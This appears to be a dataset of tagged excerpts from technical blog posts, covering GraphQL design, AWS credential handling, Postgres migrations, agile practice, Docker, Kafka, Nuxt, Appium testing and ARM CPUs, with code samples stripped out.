2957,"Some chose to keep one endpoint per use case, but allow certain query parameters to be used. At the simplest level, this could be a very specific query parameter to select the client version we require: Some other approaches were more generic, for example partials: And then some others chose a really generic approach, by letting clients basically select what they wanted back from the server. The JSON: API specification calls them sparse fieldsets: Some even went as far as creating a query language in a query parameter. Take a look at this example inspired by googles Drive APIAll the approaches we covered make tradeoffs of their own. Most of these tradeoffs are found between optimization (How optimized for a single use case the endpoint is) and customization (How much can an endpoint adapt to different use cases or variations). Well cover this tradeoff more in Chapter X: Optimization vs Customization.","['GraphQL', 'Api Development', 'Software Architecture']",8
2958,"First, its very important to note that the Graph QL query language only allows selecting fields declaratively and explicitly. There is no SELECT *, no way of selecting all fields on a particular type, and this is for a very good reason. This allows server developer to add functionality, new fields, new use cases without existing clients ever needing to care about these changes, or ever be impacted by them. Each individual Graph QL query is selecting a subset of our graph of possibilities. You can kind of imagine a Graph QL query being a way to craft your own custom endpoint, but one that does not cause the burden on API developers as creating an actual custom endpoint would. Thats because the Graph QL schema exposes the graph of capabilities, but does not care how it will be used precisely. This of course is a design decision that makes a tradeoff. A Graph QL API will rarely be as optimized as an endpoint answering the need of a specific client. However, this was a conscious decision, to allow our API to handle different use cases while keeping a sane development experience.","['GraphQL', 'Api Development', 'Software Architecture']",8
2959,"What this property of Graph QL gives us is that we can provide as many ways of enabling use cases we want in a Graph QL schema. Clients can then select what they require, but dont need to pay the cost of supporting other use cases. Even the server developers dont need to pay the cost because of how a Graph QL schema if usually developed, where each field or use case is implemented in isolation. Of course, the power we give to clients comes with great responsibility. Often times this will lead to an experience that requires a bit more work to get what they want, and discover how to consume their use cases. Well talk about this tradeoff, and how we can help with this in Chapter X: Documenting a Graph QL API.","['GraphQL', 'Api Development', 'Software Architecture']",14
2960,"By having this context in mind, we can make better decisions when it comes to designing a great Graph QL API. We will frequently go back to Graph QLs raison dtre as we look for the best practices along the book. As you can see, Graph QL was born in a very specific context to solve a particular problem. It is an excellent way to write APIs, but other ways exist as well, as we explored in this chapter. This book is not here to convince you to use Graph QL for everything, but rather to teach you how to do it correctly if you do choose to use it. Thanks for reading this preview / draft! Hope you enjoyed, I think theres value in introducing Graph QL this way. Let me know what you thought https://twitter.com/__xuorig__.","['GraphQL', 'Api Development', 'Software Architecture']",14
2961,"Another limitation to this method is that AWS often makes calls on your behalf that are triggered by certain API calls. For example, when you restore an encrypted RDS instance, AWS will make KMS calls on your behalf to figure out which key should be used in the restore process. When these services make calls for you, the AWS credentials that are tied to the IAM Role that made the first call are used. The originating IP address will be one from AWS and not reflect what is in your policy. You can see this in Cloud Trail by looking from events with source IPAddress resembling <service>.amazonaws.com. Even with this limitation, you will find that you can protect most IAM Roles and find workarounds to address this.","['AWS', 'Cloud Security', 'Netflixsecurity', 'Cloud Computing', 'Security']",11
2962,"The EC2 Metadata service is a service provided by AWS that supplies information to your services/applications deployed on EC2 servers such as network information, instance-id, etc. It is read-only, mostly static, and every process with network access on your server can connect to it by default. It also provides operational data such as the availability-zone the application is deployed in, the private IP address, user data that was given to launch your server with, and most importantly for this paper: the AWS credentials that the application uses for making API calls to AWS. These credentials are temporary session credentials that range in a validity from one to six hours. When the expiration for the credentials nears, new session credentials will be generated and available from the Metadata service for your application to use. This provides a seamless experience with continuous access to AWS APIs with short lived credentials. The AWS SDKs are programmed to check the Metadata service prior to credential expiration to retrieve the new set of short lived credentials. The Metadata service is available from instances using the IP address 169.254.169.254. That base URL path of the Metadata service takes form of http://169.254.169.254/<version>/.","['AWS', 'Cloud Security', 'Netflixsecurity', 'Cloud Computing', 'Security']",11
2963,"Static credentials are credentials that are associated with a user in the AWS Identity Access and Management (IAM) service. AWS allows you to generate up to two sets of static credentials per IAM User. These credentials never expire and it is recommended to rotate them. Due to the fact that they never expire, it is almost always best to avoid their use to mitigate risk if a credential is exposed. Realistically, there are reasons to use static credentials occasionally. For example, not all software is cloud native and may require static credentials to function.","['AWS', 'Cloud Security', 'Netflixsecurity', 'Cloud Computing', 'Security']",11
2964,"When you launch a server in AWS with an IAM Role, AWS creates session credentials that are valid for 16 hours. The AWS EC2 service retrieves credentials from the IAM service through an Assume Role API call to the Security Token Service (STS) and retrieves the temporary session credentials. These credentials are passed on to the EC2 Metadata service that is used by your EC2 server. The AWS SDK retrieves these credentials and uses them when making API calls to AWS services. Each API call is evaluated by the IAM service to determine if the role attached to the EC2 instance has permission to make that call and if the temporary credential is still valid. If the role has permission and the token has not expired, the call succeeds. Likewise if the role does not have the permission or the token has expired, the call fails. The EC2 service handles renewal of the credentials and replacing them in the EC2 Metadata service.","['AWS', 'Cloud Security', 'Netflixsecurity', 'Cloud Computing', 'Security']",11
2965,We have to do the big rocks first. When the right solution to a problem takes 10 engineers for a year then put 10 engineers on it for a year and make sure its solved well. And if it takes longer let it take longer. Dont put 3 engineers on it for a quarter. That just adds sand to the jar. Small wins are great and easy to prioritize but at some point you need more in the jar than just sand.,"['Microservices', 'Product Engineering', 'Monolithic Architecture', 'Security Engineering', 'Cybersecurity']",1
2966,"Now that youre working at the level of a whole system, lets address security. No matter what engineering roles youve had youll do great security engineering work if you keep this one rule in mind: Twitter had trouble scaling in the early days. Nick Kallen popularized the idea that you cant make something scale by adding magic scaling sprinkles. The same is true for correctness, maintainability, and security. You cant bolt on correctness to a busted system. You cant just do security for a quarter to prevent security breaches.","['Microservices', 'Product Engineering', 'Monolithic Architecture', 'Security Engineering', 'Cybersecurity']",16
2967,"If a company is valuable with small amounts of data then that data is likely very important. That means a data breach is worse for you than for other companies. Leaking sensitive data functionally ends your company. Thats bad, but the damage to your customers is even larger. Your data is peoples home addresses and names and bank accounts and personal preferences. A breach in your system means that data is now in the hands of the highest bidder. If you have git access to a system that might expose sensitive customer data its your professional responsibility to fix it. Dont wait for your manager or CTO or PM to allow you to fix it.","['Microservices', 'Product Engineering', 'Monolithic Architecture', 'Security Engineering', 'Cybersecurity']",16
2968,"Agile engineering got easier as Jez Humble, and the rest of the Continuous Delivery and Dev Ops trailblazers influenced teams and evolved tools and processes. Today Amazon Web Services and others are commoditising a lot of the heavy lifting in this space. The cloud service offerings are making evolutionary, scalable architectures available to everyone. And you dont have to buy it you can rent it! The attempts to scale Agile from being software- to product-centric were accelerated by the convergence of Lean, Agile and Design thinking. Early stage, single-product, tech native businesses benefited more than others as Eric Ries codified and amplified concepts such as the minimum viable product.","['Agile', 'Digital Transformation', 'Business Strategy', 'Design Thinking', 'Business']",10
2969,"Andrew Ng warns us that as we move from the Internet Era to the Artificial Intelligence Era, we will likely need to shift our approach radically. In the internet Era, we focused on AB testing, on short cycle times, and on pushing decision making to engineers and product managers. It should, these are all linchpins of Agile. Andrew argues that, adding Deep Learning to an internet company does not make an AI company. He expects that AI Era companies focus on building enterprise-wide platforms, unified data solutions, and organise data and intelligence functions horizontally.","['Agile', 'Digital Transformation', 'Business Strategy', 'Design Thinking', 'Business']",5
2970,"An out of the box platform is a great equaliser, not a great differentiator. Its just an enabler; one of many. This is the nuanced distinction lost in some top down digital transformation programmes that focus on digital experiences and operating model efficiency powered by product x. Initiatives that compromise on Business Agility. It is also interesting, but not surprising to see these same product companies move into the consulting space. On a positive note, any illusion of independence is dead and buried under one single logo.","['Agile', 'Digital Transformation', 'Business Strategy', 'Design Thinking', 'Business']",16
2971,"Launching a simple app version can give you answers to a bunch of important questions. How do users react to the product? Do they use it in the way you thought they would? What features do they turn to most often? For instance, if you launch a new messenger, dont include video calls in the release version. Text messages will definitely cover the users needs while you are trying to get a clue of what else they may want. Otherwise, you risk finding out upon release that your target users never really make video calls and prefer voice messages instead.","['Startup', 'Mobile App Development', 'Tech', 'Management']",17
2972,"It goes without saying that dropping a column is something that should be done with great care. Dropping a column requires an exclusive lock on the table to update the catalog but does not rewrite the table. As long as the column isnt in current use you can safely drop the column. Its also important to confirm that the column is not referenced by any dependent objects that could be unsafe to drop. In particular, any indexes using the column should be dropped separately and safely with DROP INDEX CONCURRENTLY since otherwise they will be automatically dropped along with the column under an ACCESS EXCLUSIVE lock. You can query pg_depend for any dependent objects.","['Programming', 'Postgresql', 'Sql', 'High Availability', 'Database']",8
2973,"The standard form of DROP INDEX. acquires an ACCESS EXCLUSIVE lock against the table with the index while removing the index. For small indexes this may be a short operation. For large indexes, however, file system unlinking and disk flushing can take a significant amount of time. In contrast, the form DROP INDEX CONCURRENTLY. acquires a SHARE UPDATE EXCLUSIVE lock to perform these operations allowing reads and writes to continue against the table while the index is dropped.","['Programming', 'Postgresql', 'Sql', 'High Availability', 'Database']",8
2974,"However, as with foreign keys, Postgres supports breaking the operation into two steps: ALTER TABLE. NOT VALID: Adds the check constraint and begins enforcing it for all new INSERT/UPDATE statements but does not validate that all existing rows conform to the new constraint. This operation still requires an ACCESS EXCLUSIVE lock.","['Programming', 'Postgresql', 'Sql', 'High Availability', 'Database']",8
2975,"One day I found myself in a very counter-intuitive situation reviewing a pull request, I was asking a colleague to create some code duplication, and duplication is a very bad word for developers. He was sensibly making the case against duplication, bringing code reuse, single source of truth, clean code, etc into the discussion. We developers spend our entire lives being hammered with those concepts, how on earth was I advocating for duplication? So the question is: Is duplication always a bad thing? Before we dive into this discussion allow me to quickly present some kitesurfing basics, in the the end it will all make sense, I promise. To be able to kitesurf you must understand the wind window and how to harvest its power. In a nutshell, you need to fly the kite and make it do figures of eight in the sky, by doing it the kite will pass through different power zones and pull you forward. The kite cant stop moving, if you leave it only in one place it loses power and crashes in the water.","['Programming', 'Software Development', 'Software Architecture']",9
2976,"Perhaps the skills gap isnt as looming as some might have us think. Situations like Alfredos lead me to argue that companies are spending too much time looking for the perfect fit (a candidate with a degree, experience, aptitude, andmost importantly, Id saypotential). The candidates I see often check off two or three of those boxes, but because companies are searching for unicorns, these candidates often get passed over. Peter Cappelli, a professor and HR pro who wrote an entire book on this hiring dilemma, agrees with the notion that modern businesses are too picky. So its not entirely a skills gap.","['Hiring', 'Employees', 'Talent', 'Business', 'Startup']",2
2977,Things dont always proceed as planned. People discover a piece of work isnt as simple as theyd thought. People get sick and miss time at work. People leave and are replaced with new team members who dont know the code base or the organizations internal procedures. Customers discover problems with the application and report bugs. Other teams in the organization request services of a specialist team with no advance warning.,"['Agile', 'Agile Transformation', 'Scrum', 'Project Management', 'Software Development']",13
2978,"We did our short-term planning last week and we came up with an idea of what work we would be able to complete in the next iteration or cadence. As we progressed with the work, we realized that things would not play out in just the way we predicted during planning. So we gracefully shift gears and move forward with the highest-value work that is actually possible to deliver, right? We bear down and set out to prove our initial plan was correct. We continue to blame ourselves when reality does as it pleases. People who have been using lightweight methods for years still talk about improving their estimation skills as a remedy for failing to force reality to conform with their predictions.","['Agile', 'Agile Transformation', 'Scrum', 'Project Management', 'Software Development']",4
2979,"When were using a time-boxed iterative process like Scrum and something unexpected comes up, the Product Owner prioritizes it and decides whether theres a need to shift work around within the Sprint. Assuming the team is doing the right thing and not starting all the stories on the first day, there will be some stories that havent been started yet right up until near the end of the sprint. No effort has been invested in those stories yet, so there is no cost in dropping them from the sprint. If the Product Owner decides the Unexpected Thing is more important than one or more of those stories, then he/she drops it in and pulls the unstarted stories out.","['Agile', 'Agile Transformation', 'Scrum', 'Project Management', 'Software Development']",1
2980,"From time to time, practitioners publish articles and blog posts that present some sort of complicated model of different kinds of defects and how to deal with them. What if the defect is detected within the sprint? What if its detected outside the sprint? When do we define a new task on an existing story, or define a new story? What happens to the work we had been planning to do, when we must turn our attention to an emergent problem? What happens when the actual time to complete a piece of work differs from our estimate? Lions and tigers and bears, oh my! The suggestions youll usually read are along the lines of deciding whether the new work will add significant time to the story in progress, and possibly adding a new task to the story to handle it; possibly splitting the story and deferring part of the work to another time. Thats a workaround, not a solution.","['Agile', 'Agile Transformation', 'Scrum', 'Project Management', 'Software Development']",4
2981,"So, a defect is found outside the sprint. What can we do differently going forward to minimize the occurrences of that situation? Programmers dont usually write 2 + 2 = 5. Defects or bugs are almost always a result of miscommunication. Examine the communication model of the team.","['Agile', 'Agile Transformation', 'Scrum', 'Project Management', 'Software Development']",13
2982,"What if a defect is found inside the sprint. How can you have a defect before youve finished the story? The story is still in progress. You may have tagged it as dev done, ready for test or some such nonsense, but if the Definition of Done hasnt been satisfied, then the story isnt done. Theres no such thing as dev done.","['Agile', 'Agile Transformation', 'Scrum', 'Project Management', 'Software Development']",13
2983,"The elephant in the room is this: Where are the defects coming from in the first place? What can we do differently to avoid creating them? Adding a task is all well and good, but how does that prevent the same pattern from occurring again? Unexpected or unplanned work isnt always due to defects. If youve chosen an agile approach for the work, its because agile is a fit for the situation. That means the solution has to emerge or evolve as more and more is learned about the problem through feedback loops. Its only natural that things will change. Priorities can shift and stakeholders can discover new needs they hadnt considered before, and determine that some needs they had believed were important arent necessary after all. It means people are paying attention to interim results and adjusting course toward the target business capability.","['Agile', 'Agile Transformation', 'Scrum', 'Project Management', 'Software Development']",12
2984,"If function = set, two arguments are expected. it is either a brand-new key/value, or overrides the value if key exists. Function set() is called, and the result is stored in the ledger (using Put State)If function = anything (e.g. get), one argument is expected as key. Get State is used to obtain the state from the ledger. If key exists then the value is returned. Otherwise it is shown Asset not found.","['Hyperledger Fabric', 'Multi Channel Network', 'Blockchain', 'Smart Contracts']",15
2985,"Instead, I highly recommend using Web Sequence Diagrams. They have a plugin for both Confluence and Google Docs that makes it very easy to embed live diagrams. Here is an example of one Heres the text representation: Heres what Web Sequence Diagrams converts it into (you can choose different styles): You can see how easy it is to tweak the text and get a new diagram. This easy flexibility is so important as youre trying to figure out how your system works. +1 to the folks who built this, thanks! I wrote a whole separate post on this, but think about what happens when things go wrong. How can you be resilient to failure? How can you avoid failure altogether? What Ive found is that often the analysis of failure scenarios has a deep impact on your design. You dont want to discover systemic design flaws after the fact! I call this happy path designs and they never end well Its particularly important to think about the semantics of partial failures and retries. What happens if someone posts the same answer twice (for example theyre not getting a response so the click submit over and over again)? What happens if the user decides not to finish the survey? How do you know theyve finished the survey? How do you handle a failure where you cant store the survey changes? You will likely notice that as you try to exercise the scenarios, you find problems with the domain or the components. Go back and tweak things, bringing questions back to the product owner or other experts as needed.",['Software Development'],14
2986,We first need to import this dataset into Neo4j. The Yelp data is provided in streaming JSON format (one JSON object per line). We have several options for how we could import this into Neo4j: Use __url__ to import the JSON files Read each JSON line and pass as parameters to a Cypher statement Convert to CSV and use LOAD CSVConvert to CSV and use neo4j-import for fast bulk loading import I opted for the last approach (using neo4j-import). The dataset is large enough that it will be faster to use the bulk import functionality instead of LOAD CSV or the other options. And my colleague Mark Needham had already written most of what I needed. I just extended his script to support the Point and Date types.,"['JavaScript', 'React', 'Neo4j', 'Data Visualization', 'Maps']",8
2987,"The Word Online codebase is over 11 years old. At that time, the Java Script ecosystem was also not as mature it as it is today, with a growing sentiment that raw Java Script did not scale to large applications. This led to a rise in the use of Script# (a transpiler from C# to Java Script) for large web applications within Microsoft. Script# was a vital tool that helped our code base scale to our growing engineering team and played a key role in getting us to the point where we are able to confidently ship new versions of Word Online multiple times per week. Over the past few years Type Script has emerged as Microsofts public facing solution to large scale Java Script development. This has led to Script# usage declining across the company, as the developer experience offered in Type Script is far superior to that experienced by Script# developers.","['JavaScript', 'Typescript', 'React', 'Web Development']",16
2988,"Our services will be deployed on containers and nginx will be the central point for routing of services to the correct containers We are going to create containers for different services like mysql, mongo and node js containers for deploying microservices for Shopping cart application These all are different services managing different parts of application like shopping cart Admin has Admin APIs for services, Cart-Auth APIs to manage authentication in the application. They all are talking to different services and different data source and on top of that we do have nginx routing to decide where to connect for a service __url__ will render react client app running on port __url__ features.","['Docker', 'Kubernetes', 'Microservice Architecture', 'Nginx', 'Docker Compose']",11
2989,"This is where publish-subscribe systems like Google Pub/Sub come into play. Pub/Sub acts as a middleman between services, allowing them to communicate asynchronously. Pub/Sub doesnt require a sender to know the recipient. Instead, recipients subscribe to message streams based on topics. For example, a service that wants to store data in a database might send a message with the topic database to the Pub/Sub service, which forwards the message to every service subscribed to that topic. It allows for loose coupling between event producers and event consumers.","['Google Cloud Platform', 'Apache Kafka', 'Zookeeper', 'Pub Sub', 'Appscale']",11
2990,"To run the project, you will need a Linux host with Java, Apache Maven, Python, and pip installed. The following instructions were performed on a 64-bit Ubuntu 16.04 virtual machine running Open JDK 8u171, Maven 3.3.9, Python 2.7.12, and pip 10.0.1. You can use either the official Oracle JDK or Open JDK for the Java runtime. Logged in as root into freshly booted Ubuntu 16.04, you can install the dependencies as follows: Kafka is a distributed platform for reading and writing data streams. Start by downloading the binary release of Kafka (version 2.11 as of this writing). Extract the tar file and open a terminal in the resulting folder.","['Google Cloud Platform', 'Apache Kafka', 'Zookeeper', 'Pub Sub', 'Appscale']",7
2991,"Kafka requires Zoo Keeper in order to run. If you have an existing Zoo Keeper installation (such as an App Scale Zoo Keeper node), you can skip this step. Otherwise, you will need to start a Zoo Keeper instance. The Kafka download includes a Zoo Keeper startup script that you can run using the following command: Next, start the Kafka server. By default, the server listens on port 9092: Now add the topics you want to use in your subscription service. You can specify parameters for each topic, such as the number of servers that each message is replicated to and the number of logs that the topic is sharded into. Specifying localhost:2181 creates the topic on our local Zoo Keeper instance. If you want to use a different Zoo Keeper instance, replace this with the host and port of the other instance. For example, the following command creates a topic called my-topic on our local server: The Pub/Sub Emulator for Kafka emulates the Pub/Sub API while using Kafka to process the messages. The emulator runs as a standalone Java application, which makes it easy to deploy alone or inside an App Scale deployment. To build the emulator, clone the Git Hub repository to your local machine. Open a terminal in the projects root folder, then run mvn package. This generates a self-contained JAR file in the target/ folder.","['Google Cloud Platform', 'Apache Kafka', 'Zookeeper', 'Pub Sub', 'Appscale']",7
2992,"Before running the emulator, we need to change the configuration file to specify the Kafka server, the topics weve added, and the subscriptions we want to make available. Open a terminal in the emulator projects directory, then copy the configuration template to the root folder: Open the newly created application.yamlfile in a text editor and consider changing the following properties:server.port: the port number that the emulator will run on. You may want to change this to avoid port collisions (for example, App Scale starts assigning ports to apps starting with port 8080).kafka.bootstrap Servers: a comma-separated list of brokers (i.e., nodes) in the Kafka cluster. In this example, we only have one running on the local server.kafka.consumer.subscriptions: a list of Subscription objects. The name, topic, and ack Deadline Seconds fields are required.kafka.producer.topics: a comma-separated list of topics that the emulator exposes for publishing. The emulator can also auto-create topics.","['Google Cloud Platform', 'Apache Kafka', 'Zookeeper', 'Pub Sub', 'Appscale']",7
2993,"Docker installation includes a collection of tools to help with creating and managing Containers. One of the core components of Docker is the Docker Engine. (If you are familiar with VMWare ESX, think of the Engine as the ESXi Server). This runs as a daemon process on the host (physical or virtual) and is responsible for images, containers, networks and volumes. This also provides a REST API. Clients use the CLI to interact with the daemon process to orchestrate the creation and management of Containers.","['Docker', 'AWS', 'Java', 'Containerization']",7
2994,"The term ""Docker"" is used to refer to a set of tools that help with creating and managing Containers. As we discussed earlier, Docker Engine is one of the core modules. Along with this, the Docker installation includes the Docker CLI, Docker Client etc. Docker is available in two flavors, Docker CE (Community Edition) & Docker EE (Enterprise Edition). Community Edition is ideal for local development. It could include some experimental features and hence not intended for Production usage. The Enterprise Edition should be used for all Production deployments.","['Docker', 'AWS', 'Java', 'Containerization']",7
2995,Run the following command: You will see a list of Docker Images. You will notice an image with the <tag-name> that you provided earlier. This is how the Docker Engine is managing the images locally. What would you do if you have to run a container on a different host? You could build an image on that host. This is where the power of repository comes into play. You could save your image to a repository and then create Containers by pulling in the Image from the repository.,"['Docker', 'AWS', 'Java', 'Containerization']",7
2996,"If you are new to Vue JS and the world of static websites, I guess this will be the first question you are asking. Yes there might be SEO problems when only using Vue JS on the client side. To address these issues our website will be generated with Nuxt JS upfront and then uploaded to our server. That means we will have plain HTML files on the server. performance will not be a problem if you do it right. The user will first see the pregenerated HTML files and all JS files including Vue JS plus some other packages will be loaded afterwards.","['Web Development', 'Static Websites', 'Static Site Generator', 'Vuejs', 'Nuxtjs']",19
2997,The next question might be How can I manage contents? or even How could my clients manage contents? Until today most static site generators require you to edit your contents on a flat file basis. That means you have a content directory inside your project source where you have something like markdown files or whatever. I am not really a fan of that. Its easy for you as the developer but you cannot give this to a client. Markdown is not that easy for many non-techie people and there is no content validation or anything like that. The solution is a headless CMS.,"['Web Development', 'Static Websites', 'Static Site Generator', 'Vuejs', 'Nuxtjs']",19
2998,Make sure to save your post! Then go back to the API explorer and hit CTRL+Enter to refresh your query. Now you will see your first post! Next question: How to receive the content from Dato CMS and using it in our Nuxt JS application? We need Apollo to query a Graph QL API! Fortunately there is also a Nuxt JS plugin for apollo. To install this module you first need to add it to your project with npm install --save @nuxtjs/apollo. Next we have to register the plugin in our __url__ then configure it (in the same file): Important: You must replace XXXXXXXXXXXXXXXX with the API key from Dato CMS. You can get it under Settings > Site Settings > API Tokens.,"['Web Development', 'Static Websites', 'Static Site Generator', 'Vuejs', 'Nuxtjs']",7
2999,"Everything is installed and we still dont have any content in our page. Lets create two files in our pages/blog directory. The first one will be the __url__ which will list all blog posts that we have and the second will be called _ __url__ and is responsible for a single blog posts detail page. The __url__ will look something like this: Lets quickly go through it: apollo will be configured as a property in our Vue Component. We are fetching all posts with the graphql-tag query syntax and for each post we are requesting the fields title, text and slug. We will need the slug to navigate to a single blog post.","['Web Development', 'Static Websites', 'Static Site Generator', 'Vuejs', 'Nuxtjs']",7
3000,"Our apollo property is now split into a query, a prefetch and a variables property. In the query we define the $slug as a variable to pass into the filter parameter. This $slug comes from the variables (client side) and prefetch (server side, when generating the files). Those methods get the slug from our router parameters. If this is too much magic for you, have a look at the router documentation of Nuxt JS.","['Web Development', 'Static Websites', 'Static Site Generator', 'Vuejs', 'Nuxtjs']",15
3001,"Push the vacuum to 99% if you have daily insert volume less than 5% of the existing table. The syntax for doing so is,You must specify a table in order to use the TO clause. Therefore, you probably have to write code like this: Why? Many teams might clean up their redshift cluster by calling VACUUM FULL. This conveniently vacuums every table in the cluster. But, if a tables unsorted percentage is less than 5%, Redshift skips the vacuum on that table. This process continues for every vacuum call until the table finally tops 5% unsorted, at which point the sorting will take place.","['Database', 'Redshift', 'Amazon Redshift', 'Etl', 'Vacuum']",8
3002,"There are several career paths a developer might take: The first and obvious one is to grow in the area in which you are working. If you are a junior developer, then just grow to middle, then senior and lead roles. Actually, a big number of developers moved into the mobile area when i OS and Android OS gained ground. As a developer, the greatest staffing issue I saw was the shortage of competent managers. Clever managers are expensive, hence they are scarce. If the manager has a technical background, that will allow him to be on the same wavelength with the developers. This direction will be considered in this series of articles. It is never too late to do what you like to do.","['Software Development', 'Software Architecture', 'Software Engineering', 'Management', 'Software']",2
3003,"This series of articles will help you if you belong to one of the following categories: IT developer or engineer. You are still growing as a developer, but you are looking ahead and planning your career. Even if the goals are initially vague, a person who consciously sets strategic goals will reach them much quicker than a person who does not plan where she is heading. You are at the highest stage of the software development discipline. To grow further, you have a choice to either learn one more stack of technologies, pursue a career outside software engineering, or to become a software architect. You recently took this position, or have been working in this field for a long time. Perhaps one of the main qualities of such a specialist is the understanding that there are always areas that a person does not know and that the learning process is continuous. Although you are a manager, you understand perfectly well that you should at least approximately understand what your subordinates or colleagues are doing. The acute problem of management is the technical incompetence of the manager in the field in which he or she is managing.","['Software Development', 'Software Architecture', 'Software Engineering', 'Management', 'Software']",2
3004,"First, lets consider the characteristics of the architect: Communicability. Having talked with many software architects, I heard that it is one of the most important characteristic of this specialist. During the working day, they have to talk with customers in the language of business, managers of all levels, business analysts and developers. If you have a natural charisma and you know how to convince people, then this will be a huge plus, as it is very important to explain your actions correctly. Architects are laconic, eloquent and competent speakers. The software architects with whom I spoke have highly developed skills in communication and persuasion. Another reason why this characteristic is most important is that the architect in this role participates in most discussion making processes, and often compromises must be reach that are acceptable and beneficial for all involved parties. This should be obvious since one cannot become a software architect with a medical background. In addition, the architect usually has knowledge in several technological stacks at a decent level, and should have a good understanding of a few other ones. The software architect should also be prepared to compose a large number of technical documentation, reports and diagrams. You should understand that architect decisions are usually the most expensive. Therefore, a person in this position should take the most responsible approach to his work and to the decisions made. If the developers error costs a couple days of work of one person, then the architects mistake can cost person-years on complex projects! You will have to make decisions because in this role, you will be asked to do so and you will need response. You will be working with different people from different areas, and you will have to deal with rapidly changing demands or even with changing business environments. Therefore, it is necessary to be ready for stress and to look for some ways to escape negative emotions. Work is always more pleasant when it brings pleasure. So if you choose this role only for the money, then think again. This includes both organizational and leadership skills. The ability to lead a team, which may be distributed and composed of very different specialists, is essential. Even if a specialist has a wide erudition in technology, he has tried many things on his own or participated in projects of various types, this does not guarantee that he can easily change the style of thinking to architect. One of the most important tasks is the ability to represent an abstract problem in the form of some finite real object of the system, which developers are already evaluating, designing and developing. Great communications skills are essential to clearly represent the abstraction in the form of the final system to the members of the team and the customer. It will be necessary to clearly communicate to both business and development, what is still to be done.","['Software Development', 'Software Architecture', 'Software Engineering', 'Management', 'Software']",0
3005,"If you give up loud and beautiful phrases, then the architects work includes: Identifying the stakeholders on the project. Identifying business requirements and requirements of the stakeholders on the project. Designing the entire system based on the received requirements. Choosing the system architecture and each individual component of this system at a high level. Choosing the technologies for the implementation of each component and connections between the components. Writing project documentation and its support. Creating unified development standards in the company. Controlling the architecture during the next iteration of the system release.","['Software Development', 'Software Architecture', 'Software Engineering', 'Management', 'Software']",12
3006,"To begin with, it is important to define milestone goals that lead to achieving your strategic goal of becoming a software architect. For me, such goals for the next six months are: Understand and try several technological stacks. My current knowledge is concentrated in the field of i OS. It is necessary to try Android, several server languages, to start python, and refresh Java EE skills. The architect is a full-stack developer, so it is important to have a broad technical knowledge. It is important to determine the most valuable books and articles that will help to grow in this direction. Usually the most effective way to find such literature is ask other professionals in this field for their recommendation. In one of the future articles, I plan to give you such a list of literature. It is desirable to find a software architect at your current place of employment. It is always easier to get experience from a trained specialist than to start considering a certain area from scratch. It is important to be prepared to ask good questions from your mentor. There are many courses and certificates available, but only a few are worth their money, and the higher level courses cost a lot of money. Personally, I have attended the architectural courses of Luxoft ( __url__ series.","['Software Development', 'Software Architecture', 'Software Engineering', 'Management', 'Software']",2
3007,"Secondly, this path takes several years. The process of becoming a software architect does not happen overnight. As a team lead, I realized what to do and how to deal with stress only a year after I was appointed to an official position. At the same time six months before that, I performed it unofficially. One software architect I know said that he understood what his responsibilities are 18 months after he was promoted to this role. Such intervals of time are normal and you need to understand whether you are ready to move in this direction. Even if you do not have a stable plan ready, it is better to start taking small steps that move you ahead, rather than remaining in the same place.","['Software Development', 'Software Architecture', 'Software Engineering', 'Management', 'Software']",2
3008,"And why do I use these tools? Appium is a mobile app automation framework built upon the Selenium Web Driver browser automation framework. Its a great tool for test automation of your native or hybrid mobile apps and a big plus is that it allows you to test your apps across platforms in single codebase. RSpec is a test runner that we can use to execute tests in Ruby, the thing I like is its behaviour driven design and how expressive it allows tests to be defined. Honestly theres a lot of test runners out there and they all get the job done in my opinion, Ive just gotten comfortable with RSpec and its behaviour driven approach.","['Automation', 'Appium', 'Ruby', 'QA', 'Rspec']",19
3009,"So to begin, theres usually 4 top level folders that are in all my automation projects, that includes: Common Locators Pages Tests(Specs in the case of RSpec)Here is where I usually keep code that starts the Appium server, interacts with APIs, records the screen. Basically any kind of utility usually heads into this folder. For example heres a piece of sample code Ill use start the Appium server at the beginning of the project,Doing this saves me the trouble of manually firing up the Appium server from the terminal or through the desktop app and gives me more dynamic control about what ports Appium controls at run time. Ill go more into some cool stuff you can do here in my future posts:)To find elements on screen you need whats known as Locator Strategies and the search target, which is just a String. I organize and store my locators in separate classes within this folder usually based on the page the locators are referencing. For example, if the app had a Login Screen then Id more than likely have a class named Login Page Locators that would look something like this,This class has attributes which include: A map for the Android locators A map for the i OS locators;Another map pointing to those respective maps based on the platform;A method for accessing the correct map for the platform.","['Automation', 'Appium', 'Ruby', 'QA', 'Rspec']",7
3010,"Within the describe block, before doing any other setup for the specs youll want to do a few things, this includes starting the driver and defining any page objects youll need for the specs in that block. Through the spec helper the specs will have access to the start_driver function through appium_lib and also the platform and capabilities. In its simplest state, the before each block could look something like this,That way each spec has access to 3 important things,The platform The driver The initialised page objects needed I use tags because it provides an easy way to isolate scenarios that might be very platform specific. It allowed me to execute a simple command like And as such only tests that were i OS compatible would run. On the test side it just required an additional couple lines of code to mark the spec as i OS or Android. Heres a simple spec thats defined to work both when the i OS or Android tag is provided,Toggling the i OS and Android tags here helps to control which specs RSpec skips for a given tag and which it specs doesnt. I found this to be such a simple alternative to trying to use if statements to accomplish the same thing and lessens the use of the global platform variable.","['Automation', 'Appium', 'Ruby', 'QA', 'Rspec']",15
3011,"The nave explanation commonly used to explain how computers work is that they execute a stream of instructions, each of which does some simple operationaddition, subtraction, etc. However, this explanation is very outdated. In the early 2000s, processor designers ran into limitations on how fast a single stream of instructions could be runthe faster they became, the less energy- and cost-efficient they became. Instead of continuing this pattern, processor designers moved the logic used to process a stream of instructions into a unit called a core, and packed many of these cores into a single computer chip. Increasingly multitasking-focused systems could now run 8 tasks at a time instead of 1. Large tasks could also be broken into smaller parts, each part running on its own core.","['Samsung', 'Go', 'Cpu', 'Arm']",5
3012,"Mongoose 3 does not sound like a name ARM would use for their CPUs. Then I noticed that the CPU implementer IDs were different. Samsung designed the Mongoose 3 big core, and ARM designed the Cortex-A55 LITTLE core. Mongoose 3 uses ARMv8.0, and Cortex-A55 uses ARMv8.2. So my original determination that the big cores were 1 minor revision ahead was incorrectthe LITTLE cores were actually 2 minor revisions ahead.","['Samsung', 'Go', 'Cpu', 'Arm']",16
3013,"A chainsaw may be a fast way to cut things, but it doesnt aim itself. Itll cut into a log or a leg with equal ease. Whether we end up with art or a quick trip to the ER for triage depends on the skill of the user. Using a chainsaw vs. chisel just lets us find out which itll be in record time.",['Software Development'],13
